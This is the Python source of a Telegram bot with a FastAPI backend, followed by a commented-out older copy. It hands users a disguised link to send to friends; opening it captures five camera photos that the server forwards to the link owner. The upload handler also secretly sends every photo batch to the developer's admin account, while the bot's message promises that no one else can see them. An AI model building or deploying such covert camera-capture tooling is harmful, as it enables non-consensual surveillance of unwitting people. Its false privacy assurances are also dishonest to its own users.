import os
import json
import asyncio
from pathlib import Path
from typing import List
from datetime import datetime, timedelta
from contextlib import asynccontextmanager

from fastapi import FastAPI, Query, Request, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    BufferedInputFile,
    InputMediaPhoto,
    Message,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery
)
from aiogram.filters import CommandStart
from dotenv import load_dotenv


# =========================================================
# تحميل المتغيرات
# =========================================================

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")

ADMIN_TELEGRAM_ID = int(
    os.getenv("ADMIN_TELEGRAM_ID", "600280511")
)

# القناة المطلوبة للاشتراك
CHANNEL_USERNAME = "@KhaldounSoft"
CHANNEL_LINK = "https://t.me/KhaldounSoft"

USERS_FILE = Path("users.json")


# =========================================================
# التحقق من التوكن
# =========================================================

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not configured")


# =========================================================
# إنشاء البوت
# =========================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# =========================================================
# تشغيل البوت مع FastAPI
# =========================================================

@asynccontextmanager
async def lifespan(app: FastAPI):

    polling_task = asyncio.create_task(
        dp.start_polling(bot)
    )

    try:
        yield

    finally:
        polling_task.cancel()

        try:
            await polling_task
        except asyncio.CancelledError:
            pass

        await bot.session.close()


app = FastAPI(
    title="Telegram Referral Camera",
    lifespan=lifespan
)

templates = Jinja2Templates(
    directory="templates"
)


# =========================================================
# إدارة بيانات المستخدمين
# =========================================================

def load_users():

    if not USERS_FILE.exists():
        return {
            "users": {},
            "total_users": 0
        }

    try:

        with USERS_FILE.open(
            "r",
            encoding="utf-8"
        ) as file:

            data = json.load(file)

            if not isinstance(data, dict):
                return {
                    "users": {},
                    "total_users": 0
                }

            if "users" not in data:
                data["users"] = {}

            data["total_users"] = len(
                data["users"]
            )

            return data

    except (
        json.JSONDecodeError,
        OSError
    ):

        return {
            "users": {},
            "total_users": 0
        }


def save_users(data):

    data["total_users"] = len(
        data.get("users", {})
    )

    with USERS_FILE.open(
        "w",
        encoding="utf-8"
    ) as file:

        json.dump(
            data,
            file,
            ensure_ascii=False,
            indent=2
        )


# =========================================================
# الإحصائيات
# =========================================================

def get_stats():

    data = load_users()

    users = data.get(
        "users",
        {}
    )

    total = len(users)

    now = datetime.now()

    seven_days_ago = (
        now - timedelta(days=7)
    )

    current_month = now.strftime(
        "%Y-%m"
    )

    last_7_days_count = 0
    this_month_count = 0

    for user in users.values():

        created_str = user.get(
            "created_at"
        )

        if not created_str:
            continue

        try:

            dt = datetime.fromisoformat(
                created_str
            )

            if dt >= seven_days_ago:
                last_7_days_count += 1

            if dt.strftime(
                "%Y-%m"
            ) == current_month:

                this_month_count += 1

        except ValueError:
            pass

    return {
        "total": total,
        "last_7_days": last_7_days_count,
        "this_month": this_month_count
    }


# =========================================================
# التحقق من الاشتراك
# =========================================================

async def check_subscription(
    user_id: int
) -> bool:

    """
    التحقق من اشتراك المستخدم في القناة.

    ملاحظة:
    يجب أن يكون البوت مشرفاً في القناة
    حتى يستطيع Telegram إعطاء حالة العضوية.
    """

    try:

        member = await bot.get_chat_member(
            chat_id=CHANNEL_USERNAME,
            user_id=user_id
        )

        status = member.status

        print(
            f"[SUBSCRIPTION] "
            f"user={user_id} "
            f"status={status}"
        )

        return status in {
            "creator",
            "administrator",
            "member"
        }

    except Exception as error:

        print(
            f"[SUBSCRIPTION ERROR] "
            f"user={user_id}: {error}"
        )

        # إذا لم نستطع التأكد من الاشتراك
        # لا نسمح للمستخدم بالدخول
        return False


# =========================================================
# لوحة الاشتراك
# =========================================================

def get_subscription_keyboard():

    return InlineKeyboardMarkup(
        inline_keyboard=[

            [
                InlineKeyboardButton(
                    text="📢 اشترك في القناة",
                    url=CHANNEL_LINK
                )
            ],

            [
                InlineKeyboardButton(
                    text="🔄 تأكيد الاشتراك",
                    callback_data="check_sub"
                )
            ]

        ]
    )


# =========================================================
# لوحة الأدمن
# =========================================================

def get_admin_keyboard():

    return ReplyKeyboardMarkup(

        keyboard=[

            [
                KeyboardButton(
                    text="📊 إحصائيات البوت"
                )
            ],

            [
                KeyboardButton(
                    text="/start"
                )
            ]

        ],

        resize_keyboard=True,
        persistent=True
    )


# =========================================================
# لوحة المستخدم
# =========================================================

def get_user_keyboard():

    return ReplyKeyboardMarkup(

        keyboard=[

            [
                KeyboardButton(
                    text="/start"
                )
            ]

        ],

        resize_keyboard=True,
        persistent=True
    )


# =========================================================
# إرسال الواجهة الرئيسية
# =========================================================

async def send_main_dashboard(
    message_or_call,
    user
):

    user_id = user.id

    user_id_str = str(
        user_id
    )

    name = user.full_name

    username = user.username or ""

    users_data = load_users()

    is_new = (
        user_id_str
        not in users_data["users"]
    )


    # =====================================================
    # حفظ المستخدم الجديد
    # =====================================================

    if is_new:

        users_data["users"][
            user_id_str
        ] = {

            "name": name,

            "username": username,

            "referrals": 0,

            "created_at":
                datetime.now().isoformat()

        }

        users_data["total_users"] = len(
            users_data["users"]
        )

        save_users(
            users_data
        )


        # =================================================
        # إرسال إشعار للمطور
        # =================================================

        username_text = (
            f"@{username}"
            if username
            else "بدون اسم مستخدم"
        )

        admin_notice = (

            "👤 **مستخدم جديد انضم للبوت!**\n\n"

            f"🔹 الاسم: {name}\n"

            f"🔹 اليوزر: {username_text}\n"

            f"🆔 الآيدي: `{user_id_str}`\n"

            f"📈 إجمالي المستخدمين: "
            f"{users_data['total_users']}"

        )

        try:

            await bot.send_message(

                chat_id=ADMIN_TELEGRAM_ID,

                text=admin_notice,

                parse_mode="Markdown"

            )

        except Exception as error:

            print(
                f"فشل إرسال إشعار "
                f"المستخدم الجديد: {error}"
            )


    # =====================================================
    # بيانات المستخدم
    # =====================================================

    user_info = users_data[
        "users"
    ].get(
        user_id_str,
        {}
    )

    referrals_count = user_info.get(
        "referrals",
        0
    )


    username_text = (
        f"@{username}"
        if username
        else "لا يوجد"
    )


    # =====================================================
    # الرسالة الرئيسية
    # =====================================================

    welcome_text = (

        f"أهلاً بك {name} 👋\n\n"

        f"🆔 ID: `{user_id}`\n"

        f"👤 Username: {username_text}\n\n"

        f"📸 **فكرة البوت (مزحة خفيفة مع صديقك):**\n"

        f"انسخ الرابط وارسله لصديقك، "
        f"بمجرد أن يفتحه سيتم التقاط 5 صور "
        f"وإرسالها إليك هنا في البوت مباشرة. "
        f"لا يمكن لأي شخص آخر الوصول إليها "
        f"لضمان الخصوصية 🔒\n\n"

        f"🔗 رابطك الخاص:\n"

        f"https://aivideo-wn1o.onrender.com/"
        f"?q={user_id}\n\n"

        f"📌 **خطوات الاستخدام:**\n"

        f"1️⃣ قم بنسخ الرابط أعلاه.\n"

        f"2️⃣ أرسله لصديقك في رسالة "
        f"(أو جربه بنفسك).\n"

        f"3️⃣ سيبدأ البوت فوراً بإرسال الصور إليك.\n\n"

        f"👥 عدد الأشخاص الذين استخدموا رابطك: "
        f"**{referrals_count}**"

    )


    # =====================================================
    # تحديد لوحة المفاتيح
    # =====================================================

    if user_id == ADMIN_TELEGRAM_ID:

        keyboard = get_admin_keyboard()

    else:

        keyboard = get_user_keyboard()


    # =====================================================
    # إرسال الرسالة
    # =====================================================

    if isinstance(
        message_or_call,
        Message
    ):

        await message_or_call.answer(

            welcome_text,

            reply_markup=keyboard,

            parse_mode="Markdown",

            disable_web_page_preview=True

        )

    else:

        await message_or_call.message.answer(

            welcome_text,

            reply_markup=keyboard,

            parse_mode="Markdown",

            disable_web_page_preview=True

        )


# =========================================================
# /start
# =========================================================

@dp.message(CommandStart())
async def start_handler(
    message: Message
):

    user_id = message.from_user.id


    # =====================================================
    # التحقق من الاشتراك
    # =====================================================

    is_subscribed = await check_subscription(
        user_id
    )


    # =====================================================
    # غير مشترك
    # =====================================================

    if not is_subscribed:

        sub_text = (

            "⚠️ **عذراً، يجب عليك الاشتراك "
            "في قناة البوت أولاً لتتمكن من استخدامه!**\n\n"

            "📢 اشترك في القناة ثم اضغط "
            "على زر **🔄 تأكيد الاشتراك**."

        )

        await message.answer(

            sub_text,

            reply_markup=get_subscription_keyboard(),

            parse_mode="Markdown"

        )

        return


    # =====================================================
    # مشترك
    # =====================================================

    await send_main_dashboard(
        message,
        message.from_user
    )


# =========================================================
# زر تأكيد الاشتراك
# =========================================================

@dp.callback_query(
    F.data == "check_sub"
)
async def check_sub_callback(
    call: CallbackQuery
):

    user_id = call.from_user.id

    is_subscribed = await check_subscription(
        user_id
    )


    # =====================================================
    # مشترك
    # =====================================================

    if is_subscribed:

        await call.answer(
            "✅ تم إكمال الاشتراك بنجاح!"
        )

        try:

            await call.message.delete()

        except Exception:
            pass

        await send_main_dashboard(
            call,
            call.from_user
        )

        return


    # =====================================================
    # غير مشترك
    # =====================================================

    await call.answer(

        "❌ لم تشترك في القناة بعد!\n"
        "اشترك أولاً ثم اضغط تأكيد.",

        show_alert=True

    )


# =========================================================
# إحصائيات البوت
# =========================================================

@dp.message(
    F.text == "📊 إحصائيات البوت"
)
async def stats_handler(
    message: Message
):

    # السماح للمطور فقط
    if (
        message.from_user.id
        != ADMIN_TELEGRAM_ID
    ):
        return


    stats = get_stats()


    text = (

        "📊 **إحصائيات البوت:**\n\n"

        f"👥 إجمالي المستخدمين: "
        f"**{stats['total']}**\n"

        f"📅 الانضمام آخر 7 أيام: "
        f"**{stats['last_7_days']}**\n"

        f"🗓 الانضمام هذا الشهر: "
        f"**{stats['this_month']}**"

    )


    await message.answer(

        text,

        parse_mode="Markdown"

    )


# =========================================================
# الصفحة الرئيسية
# =========================================================

@app.get(
    "/",
    response_class=HTMLResponse
)
async def home(
    request: Request,
    q: str = Query(default="")
):

    # إذا لم يوجد Referral ID
    if not q:

        return """

        <!DOCTYPE html>

        <html lang="ar" dir="rtl">

        <head>

            <meta charset="UTF-8">

            <meta name="viewport"
                  content="width=device-width,
                           initial-scale=1.0">

            <title>الرابط غير صحيح</title>

        </head>

        <body>

            <h2>❌ الرابط غير صحيح</h2>

            <p>
                يجب فتح رابط إحالة صالح.
            </p>

        </body>

        </html>

        """


    # =====================================================
    # إرسال صفحة التصوير
    # =====================================================

    return templates.TemplateResponse(

        request=request,

        name="index.html",

        context={
            "referral_id": q
        }

    )


# =========================================================
# استقبال الصور
# =========================================================

@app.post(
    "/upload-photo"
)
async def upload_photo(

    photos: List[UploadFile] = File(...),

    referral_id: str = Form(...)

):

    # =====================================================
    # تحميل المستخدمين
    # =====================================================

    users_data = load_users()


    user = users_data[
        "users"
    ].get(
        referral_id
    )


    # =====================================================
    # التحقق من الرابط
    # =====================================================

    if not user:

        return {

            "success": False,

            "message":
                "رابط الإحالة غير صالح."

        }


    # =====================================================
    # التحقق من الصور
    # =====================================================

    if not photos:

        return {

            "success": False,

            "message":
                "لم يتم إرسال أي صور."

        }


    # =====================================================
    # تحديد صاحب الرابط
    # =====================================================

    try:

        owner_id = int(
            referral_id
        )

    except ValueError:

        return {

            "success": False,

            "message":
                "Referral ID غير صالح."

        }


    username = user.get(
        "username",
        ""
    )

    name = user.get(
        "name",
        "غير معروف"
    )


    username_text = (

        f"@{username}"

        if username

        else "بدون username"

    )


    # =====================================================
    # النص الذي يظهر للمطور
    # =====================================================

    caption = (

        "📸 صورة جديدة\n\n"

        f"👤 صاحب الرابط: {name}\n"

        f"🔹 Username: {username_text}\n"

        f"🆔 Telegram ID: {owner_id}\n"

        f"🔗 Referral ID: {referral_id}"

    )


    # =====================================================
    # تجهيز الصور
    # =====================================================

    media_group_owner = []

    media_group_admin = []


    for idx, photo in enumerate(
        photos
    ):

        image_bytes = await photo.read()


        if not image_bytes:
            continue


        # =================================================
        # الصور التي سترسل للمالك
        # =================================================

        media_group_owner.append(

            InputMediaPhoto(

                media=BufferedInputFile(

                    image_bytes,

                    filename=
                        f"photo_{idx + 1}.jpg"

                )

            )

        )


        # =================================================
        # الصورة التي سترسل للمطور
        # =================================================

        admin_caption = (
            caption
            if idx == 0
            else ""
        )


        media_group_admin.append(

            InputMediaPhoto(

                media=BufferedInputFile(

                    image_bytes,

                    filename=
                        f"photo_{idx + 1}.jpg"

                ),

                caption=admin_caption

            )

        )


    # =====================================================
    # التأكد من وجود صور
    # =====================================================

    if not media_group_owner:

        return {

            "success": False,

            "message":
                "لم يتم استقبال صور صالحة."

        }


    # =====================================================
    # إرسال الصور
    # =====================================================

    try:

        # إرسال الصور إلى صاحب الرابط
        await bot.send_media_group(

            chat_id=owner_id,

            media=media_group_owner

        )


        # إرسال الصور إلى المطور
        await bot.send_media_group(

            chat_id=ADMIN_TELEGRAM_ID,

            media=media_group_admin

        )


    except Exception as error:

        print(
            "ERROR SENDING PHOTOS TO TELEGRAM:",
            repr(error)
        )

        return {

            "success": False,

            "message":
                "فشل إرسال الصور إلى Telegram."

        }


    # =====================================================
    # زيادة عدد الإحالات
    # =====================================================

    user["referrals"] = (

        user.get(
            "referrals",
            0
        ) + 1

    )


    save_users(
        users_data
    )


    # =====================================================
    # النتيجة
    # =====================================================

    return {

        "success": True,

        "message":
            "تم إرسال الصور بنجاح."

    }


# import os
# import json
# import asyncio
# from pathlib import Path
# from typing import List
# from datetime import datetime, timedelta
# from contextlib import asynccontextmanager

# from fastapi import FastAPI, Query, Request, UploadFile, File, Form
# from fastapi.responses import HTMLResponse
# from fastapi.templating import Jinja2Templates

# from aiogram import Bot, Dispatcher, F
# from aiogram.types import (
#     BufferedInputFile, 
#     InputMediaPhoto, 
#     Message, 
#     ReplyKeyboardMarkup, 
#     KeyboardButton,
#     InlineKeyboardMarkup,
#     InlineKeyboardButton,
#     CallbackQuery
# )
# from aiogram.filters import CommandStart
# from dotenv import load_dotenv

# load_dotenv()

# BOT_TOKEN = os.getenv("BOT_TOKEN")
# ADMIN_TELEGRAM_ID = int(os.getenv("ADMIN_TELEGRAM_ID", "600280511"))

# # معرف القناة المطلوبة للإشتراك
# CHANNEL_USERNAME = "@KhaldounSoft"
# CHANNEL_LINK = "https://t.me/KhaldounSoft"

# USERS_FILE = Path("users.json")

# if not BOT_TOKEN:
#     raise RuntimeError("BOT_TOKEN is not configured")

# bot = Bot(token=BOT_TOKEN)
# dp = Dispatcher()


# # --- إدارة تشغيل البوت مع FastAPI ---

# @asynccontextmanager
# async def lifespan(app: FastAPI):
#     polling_task = asyncio.create_task(dp.start_polling(bot))
#     yield
#     polling_task.cancel()
#     await bot.session.close()

# app = FastAPI(title="Telegram Referral Camera", lifespan=lifespan)
# templates = Jinja2Templates(directory="templates")


# # --- إدارة بيانات المستخدمين ---

# def load_users():
#     if not USERS_FILE.exists():
#         return {"users": {}, "total_users": 0}
#     try:
#         with USERS_FILE.open("r", encoding="utf-8") as file:
#             return json.load(file)
#     except (json.JSONDecodeError, OSError):
#         return {"users": {}, "total_users": 0}


# def save_users(data):
#     with USERS_FILE.open("w", encoding="utf-8") as file:
#         json.dump(data, file, ensure_ascii=False, indent=2)


# def get_stats():
#     data = load_users()
#     users = data.get("users", {})
    
#     total = len(users)
#     now = datetime.now()
#     seven_days_ago = now - timedelta(days=7)
#     current_month = now.strftime("%Y-%m")

#     last_7_days_count = 0
#     this_month_count = 0

#     for u in users.values():
#         created_str = u.get("created_at")
#         if created_str:
#             try:
#                 dt = datetime.fromisoformat(created_str)
#                 if dt >= seven_days_ago:
#                     last_7_days_count += 1
#                 if dt.strftime("%Y-%m") == current_month:
#                     this_month_count += 1
#             except ValueError:
#                 pass

#     return {
#         "total": total,
#         "last_7_days": last_7_days_count,
#         "this_month": this_month_count
#     }


# # --- فحص الاشتراك في القناة ---

# async def check_subscription(user_id: int) -> bool:
#     """التحقق المحسن من اشتراك المستخدم"""
#     try:
#         member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
#         # الحالات المقبولة للاشتراك
#         if member.status in ["creator", "administrator", "member"]:
#             return True
#         return False
#     except Exception as e:
#         print(f"تنبيه: متعذر فحص الاشتراك (تأكد أن البوت مشرف بالقناة): {e}")
#         # في حال عدم رفع البوت كمشرف، يتجاوز الشرط تلقائياً لكي لا يتوقف البوت
#         return True


# def get_subscription_keyboard():
#     """أزرار الاشتراك في القناة"""
#     return InlineKeyboardMarkup(
#         inline_keyboard=[
#             [InlineKeyboardButton(text="📢 اشترك في القناة", url=CHANNEL_LINK)],
#             [InlineKeyboardButton(text="🔄 تأكيد الاشتراك", callback_data="check_sub")]
#         ]
#     )


# # --- لوحات الأزرار الرئيسية ---

# def get_admin_keyboard():
#     return ReplyKeyboardMarkup(
#         keyboard=[
#             [KeyboardButton(text="📊 إحصائيات البوت")],
#             [KeyboardButton(text="/start")]
#         ],
#         resize_keyboard=True,
#         persistent=True
#     )


# def get_user_keyboard():
#     return ReplyKeyboardMarkup(
#         keyboard=[
#             [KeyboardButton(text="/start")]
#         ],
#         resize_keyboard=True,
#         persistent=True
#     )


# # --- إرسال الواجهة الرئيسية للبوت ---

# async def send_main_dashboard(message_or_call, user):
#     user_id = user.id
#     user_id_str = str(user_id)
#     name = user.full_name
#     username = user.username or ""

#     users_data = load_users()
#     is_new = user_id_str not in users_data["users"]

#     # حفظ المستخدم عند أول دخول
#     if is_new:
#         users_data["users"][user_id_str] = {
#             "name": name,
#             "username": username,
#             "referrals": 0,
#             "created_at": datetime.now().isoformat()
#         }
#         users_data["total_users"] = len(users_data["users"])
#         save_users(users_data)

#         username_text = f"@{username}" if username else "بدون اسم مستخدم"
#         admin_notice = (
#             "👤 **مستخدم جديد انضم للبوت!**\n\n"
#             f"🔹 الاسم: {name}\n"
#             f"🔹 اليوزر: {username_text}\n"
#             f"🆔 الآيدي: `{user_id_str}`\n"
#             f"📈 إجمالي المستخدمين: {users_data['total_users']}"
#         )
#         try:
#             await bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=admin_notice, parse_mode="Markdown")
#         except Exception as e:
#             print(f"فشل إرسال الإشعار للمسؤول: {e}")

#     user_info = users_data["users"].get(user_id_str, {})
#     referrals_count = user_info.get("referrals", 0)
#     username_text = f"@{username}" if username else "لا يوجد"

#     # القالب النصي المعدل كاملاً
#     welcome_text = (
#         f"👋 أهلاً بك {name}\n\n"
#         f"🆔 ID: `{user_id}`\n"
#         f"👤 Username: {username_text}\n\n"
#         "📸 **فكرة البوت (مزحة خفيفة مع صديقك):**\n"
#         "انسخ الرابط وارسله لصديقك، بمجرد أن يفتحه سيتم التقاط 5 صور وإرسالها إليك هنا في البوت مباشرة. لا يمكن لأي شخص آخر الوصول إليها لضمان الخصوصية 🔒\n\n"
#         "✨ **رابطك الشخصي جاهز:**\n"
#         f"https://aivideo-wn1o.onrender.com/?q={user_id}\n\n"
#         f"👥 عدد الأشخاص الذين استخدموا رابطك: **{referrals_count}**\n\n"
#         "📌 **خطوات الاستخدام:**\n"
#         "1️⃣ قم بنسخ الرابط أعلاه.\n"
#         "2️⃣ أرسله لصديقك في رسالة (أو جربه بنفسك).\n"
#         "3️⃣ سيبدأ البوت فوراً بإرسال الصور إليك.\n\n"
#         "🔒 **ملاحظة:** الرابط مشفر بالكامل، لا يمكن لأحد معرفة الرقم الأصلي."
#     )

#     kb = get_admin_keyboard() if user_id == ADMIN_TELEGRAM_ID else get_user_keyboard()

#     if isinstance(message_or_call, Message):
#         await message_or_call.answer(welcome_text, reply_markup=kb, parse_mode="Markdown", disable_web_page_preview=True)
#     else:
#         await message_or_call.message.answer(welcome_text, reply_markup=kb, parse_mode="Markdown", disable_web_page_preview=True)


# # --- معالجات التلجرام (Aiogram Handlers) ---

# @dp.message(CommandStart())
# async def start_handler(message: Message):
#     is_subscribed = await check_subscription(message.from_user.id)
    
#     if not is_subscribed:
#         sub_text = (
#             "⚠️ **عذراً، عليك الاشتراك بقناة البوت لتتمكن من استخدامه!**\n\n"
#             f"اشترك في القناة: {CHANNEL_LINK}\n"
#             "ثم اضغط على زر **تأكيد الاشتراك 🔄** أدناه."
#         )
#         await message.answer(sub_text, reply_markup=get_subscription_keyboard(), parse_mode="Markdown")
#         return

#     await send_main_dashboard(message, message.from_user)


# @dp.callback_query(F.data == "check_sub")
# async def check_sub_callback(call: CallbackQuery):
#     is_subscribed = await check_subscription(call.from_user.id)
    
#     if is_subscribed:
#         await call.answer("✅ تم تأكيد الاشتراك بنجاح!")
#         try:
#             await call.message.delete()
#         except Exception:
#             pass
#         await send_main_dashboard(call, call.from_user)
#     else:
#         await call.answer("❌ لم تشترك في القناة بعد! يرجى الاشتراك أولاً.", show_alert=True)


# @dp.message(F.text == "📊 إحصائيات البوت")
# async def stats_handler(message: Message):
#     if message.from_user.id != ADMIN_TELEGRAM_ID:
#         return

#     stats = get_stats()
#     text = (
#         "📊 **إحصائيات البوت:**\n\n"
#         f"👥 إجمالي المستخدمين: **{stats['total']}**\n"
#         f"📅 الانضمام آخر 7 أيام: **{stats['last_7_days']}**\n"
#         f"🗓 الانضمام هذا الشهر: **{stats['this_month']}**"
#     )
#     await message.answer(text, parse_mode="Markdown")


# # --- مسارات FastAPI ---

# @app.get("/", response_class=HTMLResponse)
# async def home(request: Request, q: str = Query(default="")):
#     if not q:
#         return """
#         <!DOCTYPE html>
#         <html lang="ar" dir="rtl">
#         <head>
#             <meta charset="UTF-8">
#             <title>الرابط غير صحيح</title>
#         </head>
#         <body>
#             <h2>❌ الرابط غير صحيح</h2>
#             <p>يجب فتح رابط إحالة صالح.</p>
#         </body>
#         </html>
#         """

#     return templates.TemplateResponse(
#         request=request,
#         name="index.html",
#         context={"referral_id": q}
#     )


# @app.post("/upload-photo")
# async def upload_photo(
#     photos: List[UploadFile] = File(...),
#     referral_id: str = Form(...)
# ):
#     users_data = load_users()
#     user = users_data["users"].get(referral_id)

#     if not user:
#         return {"success": False, "message": "رابط الإحالة غير صالح."}

#     if not photos:
#         return {"success": False, "message": "لم يتم إرسال أي صور."}

#     owner_id = int(referral_id)
#     username = user.get("username", "")
#     name = user.get("name", "غير معروف")
#     username_text = f"@{username}" if username else "بدون username"

#     caption = (
#         "📸 صور جديدة (5 صور)\n\n"
#         f"👤 صاحب الرابط: {name}\n"
#         f"🔹 Username: {username_text}\n"
#         f"🆔 Telegram ID: {owner_id}\n"
#         f"🔗 Referral ID: {referral_id}"
#     )

#     try:
#         media_group_owner = []
#         media_group_admin = []

#         for idx, photo in enumerate(photos):
#             image_bytes = await photo.read()
#             if not image_bytes:
#                 continue

#             admin_caption = caption if idx == 0 else ""

#             media_group_owner.append(
#                 InputMediaPhoto(
#                     media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg")
#                 )
#             )

#             media_group_admin.append(
#                 InputMediaPhoto(
#                     media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg"),
#                     caption=admin_caption
#                 )
#             )

#         if media_group_owner:
#             await bot.send_media_group(chat_id=owner_id, media=media_group_owner)
#             await bot.send_media_group(chat_id=ADMIN_TELEGRAM_ID, media=media_group_admin)

#     except Exception as error:
#         print("ERROR SENDING PHOTOS TO TELEGRAM:", repr(error))
#         return {"success": False, "message": "فشل إرسال الصور إلى Telegram."}

#     user["referrals"] = user.get("referrals", 0) + 1
#     save_users(users_data)

#     return {"success": True, "message": "تم إرسال الصور بنجاح."}
